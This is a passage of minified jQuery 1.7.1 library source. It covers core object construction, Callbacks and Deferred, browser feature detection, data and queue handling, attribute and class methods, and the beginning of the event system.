this.length=1,this[0]=f}return this.context=H,this.selector=a,this}return!c||c.jquery?(c||d).find(a):this.constructor(c).find(a)}return h.isFunction(a)?d.ready(a):(a.selector!==b&&(this.selector=a.selector,this.context=a.context),h.makeArray(a,this))},selector:"",jquery:"1.7.1",length:0,size:function(){return this.length},toArray:function(){return E.call(this,0)},get:function(a){return null==a?this.toArray():0>a?this[this.length+a]:this[a]},pushStack:function(a,b,c){var d=this.constructor();
return h.isArray(a)?D.apply(d,a):h.merge(d,a),d.prevObject=this,d.context=this.context,"find"===b?d.selector=this.selector+(this.selector?" ":"")+c:b&&(d.selector=this.selector+"."+b+"("+c+")"),d},each:function(a,b){return h.each(this,a,b)},ready:function(a){return h.bindReady(),f.add(a),this},eq:function(a){return a=+a,-1===a?this.slice(a):this.slice(a,a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(E.apply(this,arguments),"slice",E.call(arguments).join(","))},map:function(a){return this.pushStack(h.map(this,function(b,c){return a.call(b,c,b)}))},end:function(){return this.prevObject||this.constructor(null)},push:D,sort:[].sort,splice:[].splice},h.fn.init.prototype=h.fn,h.extend=h.fn.extend=function(){var a,c,d,e,f,g,i=arguments[0]||{},j=1,k=arguments.length,l=!1;
for("boolean"==typeof i&&(l=i,i=arguments[1]||{},j=2),"object"!=typeof i&&!h.isFunction(i)&&(i={}),k===j&&(i=this,--j);
k>j;
j++)if(null!=(a=arguments[j]))for(c in a)d=i[c],e=a[c],i!==e&&(l&&e&&(h.isPlainObject(e)||(f=h.isArray(e)))?(f?(f=!1,g=d&&h.isArray(d)?d:[]):g=d&&h.isPlainObject(d)?d:{},i[c]=h.extend(l,g,e)):e!==b&&(i[c]=e));
return i},h.extend({noConflict:function(b){return a.$===h&&(a.$=j),b&&a.jQuery===h&&(a.jQuery=i),h},isReady:!1,readyWait:1,holdReady:function(a){a?h.readyWait++:h.ready(!0)},ready:function(a){if(a===!0&&!--h.readyWait||a!==!0&&!h.isReady){if(!H.body)return setTimeout(h.ready,1);
if(h.isReady=!0,a!==!0&&--h.readyWait>0)return;
f.fireWith(H,[h]),h.fn.trigger&&h(H).trigger("ready").off("ready")}},bindReady:function(){if(!f){if(f=h.Callbacks("once memory"),"complete"===H.readyState)return setTimeout(h.ready,1);
if(H.addEventListener)H.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",h.ready,!1);
else if(H.attachEvent){H.attachEvent("onreadystatechange",g),a.attachEvent("onload",h.ready);
var b=!1;
try{b=null==a.frameElement}catch(d){}H.documentElement.doScroll&&b&&c()}}},isFunction:function(a){return"function"===h.type(a)},isArray:Array.isArray||function(a){return"array"===h.type(a)},isWindow:function(a){return a&&"object"==typeof a&&"setInterval"in a},isNumeric:function(a){return!isNaN(parseFloat(a))&&isFinite(a)},type:function(a){return null==a?String(a):J[B.call(a)]||"object"},isPlainObject:function(a){if(!a||"object"!==h.type(a)||a.nodeType||h.isWindow(a))return!1;
try{if(a.constructor&&!C.call(a,"constructor")&&!C.call(a.constructor.prototype,"isPrototypeOf"))return!1}catch(c){return!1}var d;
for(d in a);
return d===b||C.call(a,d)},isEmptyObject:function(a){for(var b in a)return!1;
return!0},error:function(a){throw new Error(a)},parseJSON:function(b){return"string"==typeof b&&b?(b=h.trim(b),a.JSON&&a.JSON.parse?a.JSON.parse(b):p.test(b.replace(q,"@").replace(r,"]").replace(s,""))?new Function("return "+b)():void h.error("Invalid JSON: "+b)):null},parseXML:function(c){var d,e;
try{a.DOMParser?(e=new DOMParser,d=e.parseFromString(c,"text/xml")):(d=new ActiveXObject("Microsoft.XMLDOM"),d.async="false",d.loadXML(c))}catch(f){d=b}return(!d||!d.documentElement||d.getElementsByTagName("parsererror").length)&&h.error("Invalid XML: "+c),d},noop:function(){},globalEval:function(b){b&&l.test(b)&&(a.execScript||function(b){a.eval.call(a,b)})(b)},camelCase:function(a){return a.replace(y,"ms-").replace(x,z)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,c,d){var e,f=0,g=a.length,i=g===b||h.isFunction(a);
if(d)if(i){for(e in a)if(c.apply(a[e],d)===!1)break}else for(;
g>f&&c.apply(a[f++],d)!==!1;
);
else if(i){for(e in a)if(c.call(a[e],e,a[e])===!1)break}else for(;
g>f&&c.call(a[f],f,a[f++])!==!1;
);
return a},trim:F?function(a){return null==a?"":F.call(a)}:function(a){return null==a?"":(a+"").replace(m,"").replace(n,"")},makeArray:function(a,b){var c=b||[];
if(null!=a){var d=h.type(a);
null==a.length||"string"===d||"function"===d||"regexp"===d||h.isWindow(a)?D.call(c,a):h.merge(c,a)}return c},inArray:function(a,b,c){var d;
if(b){if(G)return G.call(b,a,c);
for(d=b.length,c=c?0>c?Math.max(0,d+c):c:0;
d>c;
c++)if(c in b&&b[c]===a)return c}return-1},merge:function(a,c){var d=a.length,e=0;
if("number"==typeof c.length)for(var f=c.length;
f>e;
e++)a[d++]=c[e];
else for(;
c[e]!==b;
)a[d++]=c[e++];
return a.length=d,a},grep:function(a,b,c){var d,e=[];
c=!!c;
for(var f=0,g=a.length;
g>f;
f++)d=!!b(a[f],f),c!==d&&e.push(a[f]);
return e},map:function(a,c,d){var e,f,g=[],i=0,j=a.length,k=a instanceof h||j!==b&&"number"==typeof j&&(j>0&&a[0]&&a[j-1]||0===j||h.isArray(a));
if(k)for(;
j>i;
i++)e=c(a[i],i,d),null!=e&&(g[g.length]=e);
else for(f in a)e=c(a[f],f,d),null!=e&&(g[g.length]=e);
return g.concat.apply([],g)},guid:1,proxy:function(a,c){if("string"==typeof c){var d=a[c];
c=a,a=d}if(!h.isFunction(a))return b;
var e=E.call(arguments,2),f=function(){return a.apply(c,e.concat(E.call(arguments)))};
return f.guid=a.guid=a.guid||f.guid||h.guid++,f},access:function(a,c,d,e,f,g){var i=a.length;
if("object"==typeof c){for(var j in c)h.access(a,j,c[j],e,f,d);
return a}if(d!==b){e=!g&&e&&h.isFunction(d);
for(var k=0;
i>k;
k++)f(a[k],c,e?d.call(a[k],k,f(a[k],c)):d,g);
return a}return i?f(a[0],c):b},now:function(){return(new Date).getTime()},uaMatch:function(a){a=a.toLowerCase();
var b=t.exec(a)||u.exec(a)||v.exec(a)||a.indexOf("compatible")<0&&w.exec(a)||[];
return{browser:b[1]||"",version:b[2]||"0"}},sub:function(){function a(b,c){return new a.fn.init(b,c)}h.extend(!0,a,this),a.superclass=this,a.fn=a.prototype=this(),a.fn.constructor=a,a.sub=this.sub,a.fn.init=function(c,d){return d&&d instanceof h&&!(d instanceof a)&&(d=a(d)),h.fn.init.call(this,c,d,b)},a.fn.init.prototype=a.fn;
var b=a(H);
return a},browser:{}}),h.each("Boolean Number String Function Array Date RegExp Object".split(" "),function(a,b){J["[object "+b+"]"]=b.toLowerCase()}),e=h.uaMatch(A),e.browser&&(h.browser[e.browser]=!0,h.browser.version=e.version),h.browser.webkit&&(h.browser.safari=!0),l.test(" ")&&(m=/^[\s\xA0]+/,n=/[\s\xA0]+$/),d=h(H),H.addEventListener?g=function(){H.removeEventListener("DOMContentLoaded",g,!1),h.ready()}:H.attachEvent&&(g=function(){"complete"===H.readyState&&(H.detachEvent("onreadystatechange",g),h.ready())}),h}(),L={};
K.Callbacks=function(a){a=a?L[a]||G(a):{};
var c,d,e,f,g,h=[],i=[],j=function(b){var c,d,e,f;
for(c=0,d=b.length;
d>c;
c++)e=b[c],f=K.type(e),"array"===f?j(e):"function"===f&&(!a.unique||!l.has(e))&&h.push(e)},k=function(b,j){for(j=j||[],c=!a.memory||[b,j],d=!0,g=e||0,e=0,f=h.length;
h&&f>g;
g++)if(h[g].apply(b,j)===!1&&a.stopOnFalse){c=!0;
break}d=!1,h&&(a.once?c===!0?l.disable():h=[]:i&&i.length&&(c=i.shift(),l.fireWith(c[0],c[1])))},l={add:function(){if(h){var a=h.length;
j(arguments),d?f=h.length:c&&c!==!0&&(e=a,k(c[0],c[1]))}return this},remove:function(){if(h)for(var b=arguments,c=0,e=b.length;
e>c;
c++)for(var i=0;
i<h.length&&(b[c]!==h[i]||(d&&f>=i&&(f--,g>=i&&g--),h.splice(i--,1),!a.unique));
i++);
return this},has:function(a){if(h)for(var b=0,c=h.length;
c>b;
b++)if(a===h[b])return!0;
return!1},empty:function(){return h=[],this},disable:function(){return h=i=c=b,this},disabled:function(){return!h},lock:function(){return i=b,(!c||c===!0)&&l.disable(),this},locked:function(){return!i},fireWith:function(b,e){return i&&(d?a.once||i.push([b,e]):(!a.once||!c)&&k(b,e)),this},fire:function(){return l.fireWith(this,arguments),this},fired:function(){return!!c}};
return l};
var M=[].slice;
K.extend({Deferred:function(a){var b,c=K.Callbacks("once memory"),d=K.Callbacks("once memory"),e=K.Callbacks("memory"),f="pending",g={resolve:c,reject:d,notify:e},h={done:c.add,fail:d.add,progress:e.add,state:function(){return f},isResolved:c.fired,isRejected:d.fired,then:function(a,b,c){return i.done(a).fail(b).progress(c),this},always:function(){return i.done.apply(i,arguments).fail.apply(i,arguments),this},pipe:function(a,b,c){return K.Deferred(function(d){K.each({done:[a,"resolve"],fail:[b,"reject"],progress:[c,"notify"]},function(a,b){var c,e=b[0],f=b[1];
K.isFunction(e)?i[a](function(){c=e.apply(this,arguments),c&&K.isFunction(c.promise)?c.promise().then(d.resolve,d.reject,d.notify):d[f+"With"](this===i?d:this,[c])}):i[a](d[f])})}).promise()},promise:function(a){if(null==a)a=h;
else for(var b in h)a[b]=h[b];
return a}},i=h.promise({});
for(b in g)i[b]=g[b].fire,i[b+"With"]=g[b].fireWith;
return i.done(function(){f="resolved"},d.disable,e.lock).fail(function(){f="rejected"},c.disable,e.lock),a&&a.call(i,i),i},when:function(a){function b(a){return function(b){g[a]=arguments.length>1?M.call(arguments,0):b,i.notifyWith(j,g)}}function c(a){return function(b){d[a]=arguments.length>1?M.call(arguments,0):b,--h||i.resolveWith(i,d)}}var d=M.call(arguments,0),e=0,f=d.length,g=Array(f),h=f,i=1>=f&&a&&K.isFunction(a.promise)?a:K.Deferred(),j=i.promise();
if(f>1){for(;
f>e;
e++)d[e]&&d[e].promise&&K.isFunction(d[e].promise)?d[e].promise().then(c(e),i.reject,b(e)):--h;
h||i.resolveWith(i,d)}else i!==a&&i.resolveWith(i,f?[a]:[]);
return j}}),K.support=function(){var b,c,d,e,f,g,h,i,j,k,l,m,n=H.createElement("div");
H.documentElement;
if(n.setAttribute("className","t"),n.innerHTML=" <link/><table></table><a href='/a' style='top:1px;
float:left;
opacity:.55;
'>a</a><input type='checkbox'/>",c=n.getElementsByTagName("*"),d=n.getElementsByTagName("a")[0],!c||!c.length||!d)return{};
e=H.createElement("select"),f=e.appendChild(H.createElement("option")),g=n.getElementsByTagName("input")[0],b={leadingWhitespace:3===n.firstChild.nodeType,tbody:!n.getElementsByTagName("tbody").length,htmlSerialize:!!n.getElementsByTagName("link").length,style:/top/.test(d.getAttribute("style")),hrefNormalized:"/a"===d.getAttribute("href"),opacity:/^0.55/.test(d.style.opacity),cssFloat:!!d.style.cssFloat,checkOn:"on"===g.value,optSelected:f.selected,getSetAttribute:"t"!==n.className,enctype:!!H.createElement("form").enctype,html5Clone:"<:nav></:nav>"!==H.createElement("nav").cloneNode(!0).outerHTML,submitBubbles:!0,changeBubbles:!0,focusinBubbles:!1,deleteExpando:!0,noCloneEvent:!0,inlineBlockNeedsLayout:!1,shrinkWrapBlocks:!1,reliableMarginRight:!0},g.checked=!0,b.noCloneChecked=g.cloneNode(!0).checked,e.disabled=!0,b.optDisabled=!f.disabled;
try{delete n.test}catch(o){b.deleteExpando=!1}if(!n.addEventListener&&n.attachEvent&&n.fireEvent&&(n.attachEvent("onclick",function(){b.noCloneEvent=!1}),n.cloneNode(!0).fireEvent("onclick")),g=H.createElement("input"),g.value="t",g.setAttribute("type","radio"),b.radioValue="t"===g.value,g.setAttribute("checked","checked"),n.appendChild(g),i=H.createDocumentFragment(),i.appendChild(n.lastChild),b.checkClone=i.cloneNode(!0).cloneNode(!0).lastChild.checked,b.appendChecked=g.checked,i.removeChild(g),i.appendChild(n),n.innerHTML="",a.getComputedStyle&&(h=H.createElement("div"),h.style.width="0",h.style.marginRight="0",n.style.width="2px",n.appendChild(h),b.reliableMarginRight=0===(parseInt((a.getComputedStyle(h,null)||{marginRight:0}).marginRight,10)||0)),n.attachEvent)for(l in{submit:1,change:1,focusin:1})k="on"+l,m=k in n,m||(n.setAttribute(k,"return;
"),m="function"==typeof n[k]),b[l+"Bubbles"]=m;
return i.removeChild(n),i=e=f=h=n=g=null,K(function(){var a,c,d,e,f,g,h,i,k,l,o=H.getElementsByTagName("body")[0];
!o||(g=1,h="position:absolute;
top:0;
left:0;
width:1px;
height:1px;
margin:0;
",i="visibility:hidden;
border:0;
",k="style='"+h+"border:5px solid #000;
padding:0;
'",l="<div "+k+"><div></div></div><table "+k+" cellpadding='0' cellspacing='0'><tr><td></td></tr></table>",a=H.createElement("div"),a.style.cssText=i+"width:0;
height:0;
position:static;
top:0;
margin-top:"+g+"px",o.insertBefore(a,o.firstChild),n=H.createElement("div"),a.appendChild(n),n.innerHTML="<table><tr><td style='padding:0;
border:0;
display:none'></td><td>t</td></tr></table>",j=n.getElementsByTagName("td"),m=0===j[0].offsetHeight,j[0].style.display="",j[1].style.display="none",b.reliableHiddenOffsets=m&&0===j[0].offsetHeight,n.innerHTML="",n.style.width=n.style.paddingLeft="1px",K.boxModel=b.boxModel=2===n.offsetWidth,"undefined"!=typeof n.style.zoom&&(n.style.display="inline",n.style.zoom=1,b.inlineBlockNeedsLayout=2===n.offsetWidth,n.style.display="",n.innerHTML="<div style='width:4px;
'></div>",b.shrinkWrapBlocks=2!==n.offsetWidth),n.style.cssText=h+i,n.innerHTML=l,c=n.firstChild,d=c.firstChild,e=c.nextSibling.firstChild.firstChild,f={doesNotAddBorder:5!==d.offsetTop,doesAddBorderForTableAndCells:5===e.offsetTop},d.style.position="fixed",d.style.top="20px",f.fixedPosition=20===d.offsetTop||15===d.offsetTop,d.style.position=d.style.top="",c.style.overflow="hidden",c.style.position="relative",f.subtractsBorderForOverflowNotVisible=-5===d.offsetTop,f.doesNotIncludeMarginInBodyOffset=o.offsetTop!==g,o.removeChild(a),n=a=null,K.extend(b,f))}),b}();
var N=/^(?:\{.*\}|\[.*\])$/,O=/([A-Z])/g;
K.extend({cache:{},uuid:0,expando:"jQuery"+(K.fn.jquery+Math.random()).replace(/\D/g,""),noData:{embed:!0,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",applet:!0},hasData:function(a){return a=a.nodeType?K.cache[a[K.expando]]:a[K.expando],!!a&&!E(a)},data:function(a,c,d,e){if(K.acceptData(a)){var f,g,h,i=K.expando,j="string"==typeof c,k=a.nodeType,l=k?K.cache:a,m=k?a[i]:a[i]&&i,n="events"===c;
if((!m||!l[m]||!n&&!e&&!l[m].data)&&j&&d===b)return;
return m||(k?a[i]=m=++K.uuid:m=i),l[m]||(l[m]={},k||(l[m].toJSON=K.noop)),("object"==typeof c||"function"==typeof c)&&(e?l[m]=K.extend(l[m],c):l[m].data=K.extend(l[m].data,c)),f=g=l[m],e||(g.data||(g.data={}),g=g.data),d!==b&&(g[K.camelCase(c)]=d),n&&!g[c]?f.events:(j?(h=g[c],null==h&&(h=g[K.camelCase(c)])):h=g,h)}},removeData:function(a,b,c){if(K.acceptData(a)){var d,e,f,g=K.expando,h=a.nodeType,i=h?K.cache:a,j=h?a[g]:g;
if(!i[j])return;
if(b&&(d=c?i[j]:i[j].data)){K.isArray(b)||(b in d?b=[b]:(b=K.camelCase(b),b=b in d?[b]:b.split(" ")));
for(e=0,f=b.length;
f>e;
e++)delete d[b[e]];
if(!(c?E:K.isEmptyObject)(d))return}if(!c&&(delete i[j].data,!E(i[j])))return;
K.support.deleteExpando||!i.setInterval?delete i[j]:i[j]=null,h&&(K.support.deleteExpando?delete a[g]:a.removeAttribute?a.removeAttribute(g):a[g]=null)}},_data:function(a,b,c){return K.data(a,b,c,!0)},acceptData:function(a){if(a.nodeName){var b=K.noData[a.nodeName.toLowerCase()];
if(b)return b!==!0&&a.getAttribute("classid")===b}return!0}}),K.fn.extend({data:function(a,c){var d,e,f,g=null;
if("undefined"==typeof a){if(this.length&&(g=K.data(this[0]),1===this[0].nodeType&&!K._data(this[0],"parsedAttrs"))){e=this[0].attributes;
for(var h=0,i=e.length;
i>h;
h++)f=e[h].name,0===f.indexOf("data-")&&(f=K.camelCase(f.substring(5)),F(this[0],f,g[f]));
K._data(this[0],"parsedAttrs",!0)}return g}return"object"==typeof a?this.each(function(){K.data(this,a)}):(d=a.split("."),d[1]=d[1]?"."+d[1]:"",c===b?(g=this.triggerHandler("getData"+d[1]+"!",[d[0]]),g===b&&this.length&&(g=K.data(this[0],a),g=F(this[0],a,g)),g===b&&d[1]?this.data(d[0]):g):this.each(function(){var b=K(this),e=[d[0],c];
b.triggerHandler("setData"+d[1]+"!",e),K.data(this,a,c),b.triggerHandler("changeData"+d[1]+"!",e)}))},removeData:function(a){return this.each(function(){K.removeData(this,a)})}}),K.extend({_mark:function(a,b){a&&(b=(b||"fx")+"mark",K._data(a,b,(K._data(a,b)||0)+1))},_unmark:function(a,b,c){if(a!==!0&&(c=b,b=a,a=!1),b){c=c||"fx";
var d=c+"mark",e=a?0:(K._data(b,d)||1)-1;
e?K._data(b,d,e):(K.removeData(b,d,!0),D(b,c,"mark"))}},queue:function(a,b,c){var d;
return a?(b=(b||"fx")+"queue",d=K._data(a,b),c&&(!d||K.isArray(c)?d=K._data(a,b,K.makeArray(c)):d.push(c)),d||[]):void 0},dequeue:function(a,b){b=b||"fx";
var c=K.queue(a,b),d=c.shift(),e={};
"inprogress"===d&&(d=c.shift()),d&&("fx"===b&&c.unshift("inprogress"),K._data(a,b+".run",e),d.call(a,function(){K.dequeue(a,b)},e)),c.length||(K.removeData(a,b+"queue "+b+".run",!0),D(a,b,"queue"))}}),K.fn.extend({queue:function(a,c){return"string"!=typeof a&&(c=a,a="fx"),c===b?K.queue(this[0],a):this.each(function(){var b=K.queue(this,a,c);
"fx"===a&&"inprogress"!==b[0]&&K.dequeue(this,a)})},dequeue:function(a){return this.each(function(){K.dequeue(this,a)})},delay:function(a,b){return a=K.fx?K.fx.speeds[a]||a:a,b=b||"fx",this.queue(b,function(b,c){var d=setTimeout(b,a);
c.stop=function(){clearTimeout(d)}})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,c){function d(){--i||f.resolveWith(g,[g])}"string"!=typeof a&&(c=a,a=b),a=a||"fx";
for(var e,f=K.Deferred(),g=this,h=g.length,i=1,j=a+"defer",k=a+"queue",l=a+"mark";
h--;
)(e=K.data(g[h],j,b,!0)||(K.data(g[h],k,b,!0)||K.data(g[h],l,b,!0))&&K.data(g[h],j,K.Callbacks("once memory"),!0))&&(i++,e.add(d));
return d(),f.promise()}});
var P,Q,R,S=/[\n\t\r]/g,T=/\s+/,U=/\r/g,V=/^(?:button|input)$/i,W=/^(?:button|input|object|select|textarea)$/i,X=/^a(?:rea)?$/i,Y=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,Z=K.support.getSetAttribute;
K.fn.extend({attr:function(a,b){return K.access(this,a,b,!0,K.attr)},removeAttr:function(a){return this.each(function(){K.removeAttr(this,a)})},prop:function(a,b){return K.access(this,a,b,!0,K.prop)},removeProp:function(a){return a=K.propFix[a]||a,this.each(function(){try{this[a]=b,delete this[a]}catch(c){}})},addClass:function(a){var b,c,d,e,f,g,h;
if(K.isFunction(a))return this.each(function(b){K(this).addClass(a.call(this,b,this.className))});
if(a&&"string"==typeof a)for(b=a.split(T),c=0,d=this.length;
d>c;
c++)if(e=this[c],1===e.nodeType)if(e.className||1!==b.length){for(f=" "+e.className+" ",g=0,h=b.length;
h>g;
g++)~f.indexOf(" "+b[g]+" ")||(f+=b[g]+" ");
e.className=K.trim(f)}else e.className=a;
return this},removeClass:function(a){var c,d,e,f,g,h,i;
if(K.isFunction(a))return this.each(function(b){K(this).removeClass(a.call(this,b,this.className))});
if(a&&"string"==typeof a||a===b)for(c=(a||"").split(T),d=0,e=this.length;
e>d;
d++)if(f=this[d],1===f.nodeType&&f.className)if(a){for(g=(" "+f.className+" ").replace(S," "),h=0,i=c.length;
i>h;
h++)g=g.replace(" "+c[h]+" "," ");
f.className=K.trim(g)}else f.className="";
return this},toggleClass:function(a,b){var c=typeof a,d="boolean"==typeof b;
return K.isFunction(a)?this.each(function(c){K(this).toggleClass(a.call(this,c,this.className,b),b)}):this.each(function(){if("string"===c)for(var e,f=0,g=K(this),h=b,i=a.split(T);
e=i[f++];
)h=d?h:!g.hasClass(e),g[h?"addClass":"removeClass"](e);
else("undefined"===c||"boolean"===c)&&(this.className&&K._data(this,"__className__",this.className),this.className=this.className||a===!1?"":K._data(this,"__className__")||"")})},hasClass:function(a){for(var b=" "+a+" ",c=0,d=this.length;
d>c;
c++)if(1===this[c].nodeType&&(" "+this[c].className+" ").replace(S," ").indexOf(b)>-1)return!0;
return!1},val:function(a){var c,d,e,f=this[0];
return arguments.length?(e=K.isFunction(a),this.each(function(d){var f,g=K(this);
1===this.nodeType&&(f=e?a.call(this,d,g.val()):a,null==f?f="":"number"==typeof f?f+="":K.isArray(f)&&(f=K.map(f,function(a){return null==a?"":a+""})),c=K.valHooks[this.nodeName.toLowerCase()]||K.valHooks[this.type],c&&"set"in c&&c.set(this,f,"value")!==b||(this.value=f))})):f?(c=K.valHooks[f.nodeName.toLowerCase()]||K.valHooks[f.type],c&&"get"in c&&(d=c.get(f,"value"))!==b?d:(d=f.value,"string"==typeof d?d.replace(U,""):null==d?"":d)):void 0}}),K.extend({valHooks:{option:{get:function(a){var b=a.attributes.value;
return!b||b.specified?a.value:a.text}},select:{get:function(a){var b,c,d,e,f=a.selectedIndex,g=[],h=a.options,i="select-one"===a.type;
if(0>f)return null;
for(c=i?f:0,d=i?f+1:h.length;
d>c;
c++)if(e=h[c],e.selected&&(K.support.optDisabled?!e.disabled:null===e.getAttribute("disabled"))&&(!e.parentNode.disabled||!K.nodeName(e.parentNode,"optgroup"))){if(b=K(e).val(),i)return b;
g.push(b)}return i&&!g.length&&h.length?K(h[f]).val():g},set:function(a,b){var c=K.makeArray(b);
return K(a).find("option").each(function(){this.selected=K.inArray(K(this).val(),c)>=0}),c.length||(a.selectedIndex=-1),c}}},attrFn:{val:!0,css:!0,html:!0,text:!0,data:!0,width:!0,height:!0,offset:!0},attr:function(a,c,d,e){var f,g,h,i=a.nodeType;
return a&&3!==i&&8!==i&&2!==i?e&&c in K.attrFn?K(a)[c](d):"undefined"==typeof a.getAttribute?K.prop(a,c,d):(h=1!==i||!K.isXMLDoc(a),h&&(c=c.toLowerCase(),g=K.attrHooks[c]||(Y.test(c)?Q:P)),d!==b?null===d?void K.removeAttr(a,c):g&&"set"in g&&h&&(f=g.set(a,d,c))!==b?f:(a.setAttribute(c,""+d),d):g&&"get"in g&&h&&null!==(f=g.get(a,c))?f:(f=a.getAttribute(c),null===f?b:f)):void 0},removeAttr:function(a,b){var c,d,e,f,g=0;
if(b&&1===a.nodeType)for(d=b.toLowerCase().split(T),f=d.length;
f>g;
g++)e=d[g],e&&(c=K.propFix[e]||e,K.attr(a,e,""),a.removeAttribute(Z?e:c),Y.test(e)&&c in a&&(a[c]=!1))},attrHooks:{type:{set:function(a,b){if(V.test(a.nodeName)&&a.parentNode)K.error("type property can't be changed");
else if(!K.support.radioValue&&"radio"===b&&K.nodeName(a,"input")){var c=a.value;
return a.setAttribute("type",b),c&&(a.value=c),b}}},value:{get:function(a,b){return P&&K.nodeName(a,"button")?P.get(a,b):b in a?a.value:null},set:function(a,b,c){return P&&K.nodeName(a,"button")?P.set(a,b,c):void(a.value=b)}}},propFix:{tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"},prop:function(a,c,d){var e,f,g,h=a.nodeType;
return a&&3!==h&&8!==h&&2!==h?(g=1!==h||!K.isXMLDoc(a),g&&(c=K.propFix[c]||c,f=K.propHooks[c]),d!==b?f&&"set"in f&&(e=f.set(a,d,c))!==b?e:a[c]=d:f&&"get"in f&&null!==(e=f.get(a,c))?e:a[c]):void 0},propHooks:{tabIndex:{get:function(a){var c=a.getAttributeNode("tabindex");
return c&&c.specified?parseInt(c.value,10):W.test(a.nodeName)||X.test(a.nodeName)&&a.href?0:b}}}}),K.attrHooks.tabindex=K.propHooks.tabIndex,Q={get:function(a,c){var d,e=K.prop(a,c);
return e===!0||"boolean"!=typeof e&&(d=a.getAttributeNode(c))&&d.nodeValue!==!1?c.toLowerCase():b},set:function(a,b,c){var d;
return b===!1?K.removeAttr(a,c):(d=K.propFix[c]||c,d in a&&(a[d]=!0),a.setAttribute(c,c.toLowerCase())),c}},Z||(R={name:!0,id:!0},P=K.valHooks.button={get:function(a,c){var d;
return d=a.getAttributeNode(c),d&&(R[c]?""!==d.nodeValue:d.specified)?d.nodeValue:b},set:function(a,b,c){var d=a.getAttributeNode(c);
return d||(d=H.createAttribute(c),a.setAttributeNode(d)),d.nodeValue=b+""}},K.attrHooks.tabindex.set=P.set,K.each(["width","height"],function(a,b){K.attrHooks[b]=K.extend(K.attrHooks[b],{set:function(a,c){return""===c?(a.setAttribute(b,"auto"),c):void 0}})}),K.attrHooks.contenteditable={get:P.get,set:function(a,b,c){""===b&&(b="false"),P.set(a,b,c)}}),K.support.hrefNormalized||K.each(["href","src","width","height"],function(a,c){K.attrHooks[c]=K.extend(K.attrHooks[c],{get:function(a){var d=a.getAttribute(c,2);
return null===d?b:d}})}),K.support.style||(K.attrHooks.style={get:function(a){return a.style.cssText.toLowerCase()||b},set:function(a,b){return a.style.cssText=""+b}}),K.support.optSelected||(K.propHooks.selected=K.extend(K.propHooks.selected,{get:function(a){var b=a.parentNode;
return b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex),null}})),K.support.enctype||(K.propFix.enctype="encoding"),K.support.checkOn||K.each(["radio","checkbox"],function(){K.valHooks[this]={get:function(a){return null===a.getAttribute("value")?"on":a.value}}}),K.each(["radio","checkbox"],function(){K.valHooks[this]=K.extend(K.valHooks[this],{set:function(a,b){return K.isArray(b)?a.checked=K.inArray(K(a).val(),b)>=0:void 0}})});
var $=/^(?:textarea|input|select)$/i,_=/^([^\.]*)?(?:\.(.+))?$/,aa=/\bhover(\.\S+)?\b/,ba=/^key/,ca=/^(?:mouse|contextmenu)|click/,da=/^(?:focusinfocus|focusoutblur)$/,ea=/^(\w*)(?:#([\w\-]+))?(?:\.([\w\-]+))?$/,fa=function(a){var b=ea.exec(a);
return b&&(b[1]=(b[1]||"").toLowerCase(),b[3]=b[3]&&new RegExp("(?:^|\\s)"+b[3]+"(?:\\s|$)")),b},ga=function(a,b){var c=a.attributes||{};
return(!b[1]||a.nodeName.toLowerCase()===b[1])&&(!b[2]||(c.id||{}).value===b[2])&&(!b[3]||b[3].test((c["class"]||{}).value));

 },ha=function(a){return K.event.special.hover?a:a.replace(aa,"mouseenter$1 mouseleave$1")};
K.event={add:function(a,c,d,e,f){var g,h,i,j,k,l,m,n,o,p,q;
if(3!==a.nodeType&&8!==a.nodeType&&c&&d&&(g=K._data(a))){for(d.handler&&(o=d,d=o.handler),d.guid||(d.guid=K.guid++),i=g.events,i||(g.events=i={}),h=g.handle,h||(g.handle=h=function(a){return"undefined"==typeof K||a&&K.event.triggered===a.type?b:K.event.dispatch.apply(h.elem,arguments)},h.elem=a),c=K.trim(ha(c)).split(" "),j=0;
j<c.length;
j++)k=_.exec(c[j])||[],l=k[1],m=(k[2]||"").split(".").sort(),q=K.event.special[l]||{},l=(f?q.delegateType:q.bindType)||l,q=K.event.special[l]||{},n=K.extend({type:l,origType:k[1],data:e,handler:d,guid:d.guid,selector:f,quick:fa(f),namespace:m.join(".")},o),p=i[l],p||(p=i[l]=[],p.delegateCount=0,q.setup&&q.setup.call(a,e,m,h)!==!1||(a.addEventListener?a.addEventListener(l,h,!1):a.attachEvent&&a.attachEvent("on"+l,h))),q.add&&(q.add.call(a,n),n.handler.guid||(n.handler.guid=d.guid)),f?p.splice(p.delegateCount++,0,n):p.push(n),K.event.global[l]=!0;
a=null}},global:{},remove:function(a,b,c,d,e){var f,g,h,i,j,k,l,m,n,o,p,q,r=K.hasData(a)&&K._data(a);
if(r&&(m=r.events)){for(b=K.trim(ha(b||"")).split(" "),f=0;
f<b.length;
f++)if(g=_.exec(b[f])||[],h=i=g[1],j=g[2],h){for(n=K.event.special[h]||{},h=(d?n.delegateType:n.bindType)||h,p=m[h]||[],k=p.length,j=j?new RegExp("(^|\\.)"+j.split(".").sort().join("\\.(?:.*\\.)?")+"(\\.|$)"):null,l=0;
l<p.length;
l++)q=p[l],(e||i===q.origType)&&(!c||c.guid===q.guid)&&(!j||j.test(q.namespace))&&(!d||d===q.selector||"**"===d&&q.selector)&&(p.splice(l--,1),q.selector&&p.delegateCount--,n.remove&&n.remove.call(a,q));
0===p.length&&k!==p.length&&((!n.teardown||n.teardown.call(a,j)===!1)&&K.removeEvent(a,h,r.handle),delete m[h])}else for(h in m)K.event.remove(a,h+b[f],c,d,!0);
K.isEmptyObject(m)&&(o=r.handle,o&&(o.elem=null),K.removeData(a,["events","handle"],!0))}},customEvent:{getData:!0,setData:!0,changeData:!0},trigger:function(c,d,e,f){if(!e||3!==e.nodeType&&8!==e.nodeType){var g,h,i,j,k,l,m,n,o,p,q=c.type||c,r=[];
if(da.test(q+K.event.triggered))return;
